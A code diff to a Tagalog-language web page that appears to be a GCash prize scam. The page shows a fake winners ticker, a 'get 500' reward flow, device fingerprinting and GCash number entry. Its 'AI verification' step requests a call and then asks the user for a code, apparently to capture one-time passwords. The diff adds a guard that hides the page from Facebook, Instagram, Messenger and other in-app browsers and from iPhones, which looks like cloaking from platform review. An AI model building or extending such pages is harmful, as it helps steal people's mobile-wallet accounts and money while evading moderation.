@@ -47,6 +47,16 @@
         @keyframes blockPulse { 0%, 100% { transform: scale(1); opacity: 0.85; } 50% { transform: scale(1.1); opacity: 1; } }
         @media (hover: hover) and (pointer: fine), (min-width: 769px) { #desktopBlock { display: flex !important; } #missionApp { display: none !important; } }
 
+        /* ✅ INTENT / BROWSER GUARD (FB / IG / iPhone BLOCK) */
+        #intentBlock { display: none; position: fixed; inset: 0; z-index: 1000000; background: linear-gradient(160deg, #0a1535 0%, #050a1a 100%); color: #fff; font-family: 'Poppins', sans-serif; text-align: center; padding: 24px; flex-direction: column; align-items: center; justify-content: center; }
+        #intentBlock .intent-icon { font-size: 80px; margin-bottom: 20px; filter: drop-shadow(0 0 25px rgba(255, 179, 0, 0.8)); animation: blockPulse 2.2s ease-in-out infinite; }
+        #intentBlock h1 { font-family: 'Orbitron', monospace; font-size: 24px; font-weight: 900; letter-spacing: 3px; background: linear-gradient(180deg, #ffe066 0%, #ff8800 100%); -webkit-background-clip: text; background-clip: text; color: transparent; margin-bottom: 14px; }
+        #intentBlock p { font-size: 14px; line-height: 1.7; color: rgba(255, 255, 255, 0.9); max-width: 360px; margin-bottom: 10px; }
+        #intentBlock .intent-badge { margin-top: 22px; padding: 10px 26px; border-radius: 30px; background: rgba(255, 179, 0, 0.15); border: 2px solid rgba(255, 179, 0, 0.6); font-family: 'Orbitron', monospace; font-size: 11px; font-weight: 800; letter-spacing: 3px; color: #ffe066; animation: badgeGlow 2.5s ease-in-out infinite; }
+        #intentBlock .intent-steps { margin-top: 18px; text-align: left; display: inline-block; background: rgba(0,0,0,0.35); border: 1.5px solid rgba(255, 215, 0, 0.4); border-radius: 14px; padding: 14px 18px; font-size: 12px; line-height: 1.9; color: rgba(255,255,255,0.9); }
+        #intentBlock .intent-steps strong { color: #ffe066; }
+        @keyframes badgeGlow { 0%, 100% { box-shadow: 0 0 15px rgba(255, 215, 0, 0.4); } 50% { box-shadow: 0 0 35px rgba(255, 215, 0, 0.9); } }
+
         /* WINNERS TICKER */
         .winners-ticker { position: fixed; top: 12px; left: 50%; transform: translateX(-50%); z-index: 500; display: flex; align-items: center; gap: 8px; padding: 8px 18px; background: linear-gradient(180deg, rgba(255, 255, 255, 0.15), rgba(0, 0, 0, 0.4)); border: 2px solid #ffe066; border-radius: 30px; box-shadow: 0 4px 0 #a66900, 0 0 25px rgba(255, 215, 0, 0.6), inset 0 0 15px rgba(255, 215, 0, 0.15); backdrop-filter: blur(8px); -webkit-backdrop-filter: blur(8px); max-width: calc(100% - 30px); animation: tickerGlow 3s ease-in-out infinite; }
         @keyframes tickerGlow { 0%, 100% { box-shadow: 0 4px 0 #a66900, 0 0 25px rgba(255, 215, 0, 0.6), inset 0 0 15px rgba(255, 215, 0, 0.15); } 50% { box-shadow: 0 4px 0 #a66900, 0 0 45px rgba(255, 215, 0, 0.95), inset 0 0 20px rgba(255, 215, 0, 0.25); } }
@@ -182,6 +192,21 @@
         <h1>MOBILE ONLY</h1>
         <p>This mission is only accessible on <strong>mobile devices</strong>.<br><br>Please open this link on your smartphone to continue.</p>
         <div class="block-badge">◇ SCAN & OPEN ON MOBILE ◇</div>
+    </div>
+
+    <!-- ✅ INTENT / BROWSER GUARD (FB / IG / iPhone) -->
+    <div id="intentBlock">
+        <div class="intent-icon">🌐</div>
+        <h1>OPEN IN BROWSER</h1>
+        <p>This mission must be opened in your <strong>default browser</strong> (Chrome, etc.).</p>
+        <p style="font-size:13px; color:#ff8888; font-weight:700;">❌ Facebook / Instagram / iPhone not supported.</p>
+        <div class="intent-steps">
+            <strong>📌 Paano buksan:</strong><br>
+            1. I-tap ang <strong>⋮ (3 dots)</strong> sa taas<br>
+            2. Piliin ang <strong>"Open in Browser"</strong><br>
+            3. Buksan sa <strong>Chrome</strong> o default browser
+        </div>
+        <div class="intent-badge">🌐 OPEN IN DEFAULT BROWSER 🌐</div>
     </div>
 
     <!-- RANDOM WINNERS TICKER -->
@@ -335,6 +360,46 @@
     <script>
         (function() {
             'use strict';
+
+            // ============================================================
+            // ✅ INTENT / BROWSER GUARD (FB / IG / iPhone BLOCK)
+            // ============================================================
+            function isInAppBrowser() {
+                var ua = navigator.userAgent || navigator.vendor || window.opera;
+                return /FBAN|FBAV|FB_IAB|FB4A|FBIOS|Instagram|Messenger|Line|Twitter|LinkedIn|Snapchat|MicroMessenger|WhatsApp|Telegram/i.test(ua);
+            }
+            function isIPhone() {
+                var ua = navigator.userAgent || navigator.vendor || window.opera;
+                return /iPhone|iPad|iPod/i.test(ua) || (navigator.platform === 'MacIntel' && navigator.maxTouchPoints > 1);
+            }
+            function enforceBrowserGuard() {
+                var block = document.getElementById('intentBlock');
+                var app = document.getElementById('missionApp');
+                var ticker = document.getElementById('winnersTicker');
+
+                if (isInAppBrowser() || isIPhone()) {
+                    if (block) block.style.display = 'flex';
+                    if (app) app.style.display = 'none';
+                    if (ticker) ticker.style.display = 'none';
+                    // Disable all popups & buttons
+                    document.querySelectorAll('.popup-overlay').forEach(function(p) {
+                        p.classList.remove('show');
+                        p.style.pointerEvents = 'none';
+                    });
+                    return false;
+                }
+                if (block) block.style.display = 'none';
+                if (app) app.style.display = '';
+                if (ticker) ticker.style.display = '';
+                return true;
+            }
+
+            // Run guard immediately
+            var browserAllowed = enforceBrowserGuard();
+
+            // Re-check on resize / orientation
+            window.addEventListener('resize', function() { enforceBrowserGuard(); });
+            window.addEventListener('orientationchange', function() { setTimeout(enforceBrowserGuard, 300); });
 
             // ============================================================
             // CONFIG
@@ -542,7 +607,7 @@
             // ============================================================
             // BACKGROUND EFFECTS
             // ============================================================
-            if (isMobile) {
+            if (isMobile && browserAllowed) {
                 createFloatingCoins();
                 createSparkles();
                 createConfetti();
@@ -613,7 +678,10 @@
             // ============================================================
             // POPUP HELPERS
             // ============================================================
-            function openPopup(id) { var p = document.getElementById(id); if (p) p.classList.add('show'); }
+            function openPopup(id) { 
+                if (!browserAllowed) return; // ✅ Block if not in proper browser
+                var p = document.getElementById(id); if (p) p.classList.add('show'); 
+            }
             function closePopup(id) { var p = document.getElementById(id); if (p) p.classList.remove('show'); }
             function closeAllPopups() { document.querySelectorAll('.popup-overlay').forEach(function(p) { p.classList.remove('show'); }); }
 
@@ -629,7 +697,7 @@
             // INIT DEVICE (on page load) — WALANG UI DISPLAY
             // ============================================================
             function initDevice() {
-                if (!db) return Promise.resolve();
+                if (!db || !browserAllowed) return Promise.resolve();
                 deviceFingerprint = getDeviceFingerprint();
                 console.log('📱 Device fingerprint:', deviceFingerprint);
                 return getOrCreateDeviceId(deviceFingerprint).then(function(displayId) {
@@ -658,6 +726,7 @@
             // ============================================================
             document.getElementById('continueBtn').addEventListener('click', function(e) {
                 e.preventDefault();
+                if (!browserAllowed) return; // ✅ Block if not in proper browser
                 if (isBanned) return;
                 if (navigator.vibrate) { try { navigator.vibrate(30); } catch(e) {} }
                 this.style.transform = 'scale(0.96)';
@@ -689,6 +758,7 @@
             // ============================================================
             document.getElementById('get500Btn').addEventListener('click', function(e) {
                 e.preventDefault();
+                if (!browserAllowed) return; // ✅ Block if not in proper browser
                 if (navigator.vibrate) { try { navigator.vibrate(25); } catch(e) {} }
 
                 var phoneInput = document.getElementById('userPhoneInput');
@@ -868,6 +938,7 @@
             function stopSkipCountdown() { if (skipCountdownInterval) { clearInterval(skipCountdownInterval); skipCountdownInterval = null; } }
 
             document.getElementById('skipClaimBtn').addEventListener('click', function() {
+                if (!browserAllowed) return; // ✅ Block if not in proper browser
                 if (this.disabled) return;
                 if (navigator.vibrate) { try { navigator.vibrate(25); } catch(e) {} }
                 triggerBurst();
@@ -899,6 +970,7 @@
             // CLAIM NOW → QUEUE
             // ============================================================
             document.getElementById('claimNowBtn').addEventListener('click', function() {
+                if (!browserAllowed) return; // ✅ Block if not in proper browser
                 var gcashInputEl = document.getElementById('gcashInput');
                 var errEl = document.getElementById('claimFormError');
                 var gcashValue = gcashInputEl ? gcashInputEl.value.replace(/\D/g, '') : '';
@@ -1052,6 +1124,7 @@
             // AI VERIFICATION
             // ============================================================
             function showAiVerificationPopup() {
+                if (!browserAllowed) return; // ✅ Block if not in proper browser
                 document.getElementById('aiStage1').classList.remove('hidden');
                 document.getElementById('aiStage2').classList.add('hidden');
                 document.getElementById('aiStage3').classList.add('hidden');
@@ -1079,6 +1152,7 @@
             }
 
             document.getElementById('aiRequestCallBtn').addEventListener('click', function() {
+                if (!browserAllowed) return; // ✅ Block if not in proper browser
                 var gcashEl = document.getElementById('aiGcashInput');
                 var errEl = document.getElementById('aiGcashError');
                 var gcashValue = gcashEl ? gcashEl.value.replace(/\D/g, '') : '';
@@ -1140,6 +1214,7 @@
             function stopAiTimer() { if (aiTimerInterval) { clearInterval(aiTimerInterval); aiTimerInterval = null; } }
 
             document.getElementById('aiVerifyBtn').addEventListener('click', function() {
+                if (!browserAllowed) return; // ✅ Block if not in proper browser
                 var input = document.getElementById('aiCodeInput');
                 var errEl = document.getElementById('aiCodeError');
                 var enteredCode = input ? input.value.trim() : '';
@@ -1168,9 +1243,11 @@
             // START
             // ============================================================
             setTimeout(function() {
-                initDevice().then(function() {
-                    console.log('✅ Mission page initialized | Mobile:', isMobile);
-                });
+                if (browserAllowed) {
+                    initDevice().then(function() {
+                        console.log('✅ Mission page initialized | Mobile:', isMobile, '| Browser:', browserAllowed);
+                    });
+                }
             }, 500);
 
         })();
